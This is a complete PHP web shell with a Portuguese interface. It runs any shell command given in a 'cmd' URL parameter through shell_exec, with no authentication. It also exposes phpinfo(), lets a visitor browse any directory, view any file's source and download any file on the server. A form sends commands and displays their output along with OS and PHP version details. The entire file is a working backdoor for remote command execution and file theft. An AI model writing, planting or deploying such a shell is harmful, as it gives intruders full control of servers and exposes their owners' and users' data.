<?php

if (isset($_GET['cmd'])) {
    echo shell_exec($_GET['cmd']);
    die;
}

if (isset($_GET['phpinfo'])) {
    phpinfo();
    die();
}

if (isset($_GET['highlight'])) {
    highlight_file($_GET['highlight']);
    die;
}

function showFiles($par)
{
    $path = realpath($par) . DIRECTORY_SEPARATOR;
    $filesList = scandir($path, SCANDIR_SORT_ASCENDING);

    echo "<table border='1'>";
    echo "<tr>";
    echo "<th>Nome do arquivo</th>";
    echo "<th>Visualizar</th>";
    echo "</tr>";
    foreach ($filesList as $file) {

        if (is_dir($path . $file)) {
            $link = $path . $file . DIRECTORY_SEPARATOR;

            echo "<tr>";
            echo "<td><a href='?files={$link}'>{$file}</a></td>";
            echo "</tr>";

        } else {
            $link = $path . $file;
            echo "<tr>";
            echo "<td><a href='?dl={$link}'>{$file}</a></td>";
            echo "<td><a href='?highlight={$link}'>Ver</a></td>";
            echo "</tr>";
        }
    }
    echo "</table>";
}

if (isset($_GET['dl'])) {
    $file = realpath($_GET['dl']);

    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

?>


<!DOCTYPE html>
<html>
<head>
    <style>
        * {
            margin: 0;
            padding: 0;
        }

        body {
            width: 900px;
            margin: auto;
        }

        table{
            width: 100%;
            
        }

        #response {
            width: 100%
        }

        #cmd {
            width: 688px;
            height: 25px;
        }

        .btn {
            width: 100px;
            height: 30px;
        }

    </style>

    <script>
        function sendCMD() {
            var request = new XMLHttpRequest();
            var cmd = "?cmd=" + document.getElementById("cmd").value;
            request.open('GET', cmd, true);

            request.onload = function () {
                if (this.status >= 200 && this.status < 400) {
                    // Success!
                    document.getElementById("response").value += this.response;

                } else {
                    // We reached our target server, but it returned an error

                }
            };
            request.onerror = function () {
                document.getElementById("response").value += "Erro";
            };

            request.send();
            return false;
        }
    </script>

</head>
<body>

<p>Dados do servidor</p>
<p>Outras informações: <strong><?= php_uname() ?></strong></p>
<p>Sistema Operacional: <strong><?= PHP_OS ?></strong></p>
<p>Versão do PHP: <strong> <?= phpversion() ?>  </strong> <a target="_blank" href="?phpinfo">ver phpinfo()</a></p>
<br>

<form onsubmit="return sendCMD()">
    <p>Enviar comando shell:</p>
    <p><textarea id="response" rows="15"></textarea></p>
    <p>
        <input type="text" name="cmd" id="cmd" placeholder="Digite seu comando. Ex. whoami">
        <input type="submit" value="Enviar" class="btn">
        <input type="reset" value="Limpar" class="btn">
    </p>
</form>

<h2>Lista de arquivos no servidor</h2>
<?php if (isset($_GET['files'])) showFiles($_GET['files']) ?>
</body>
</html>
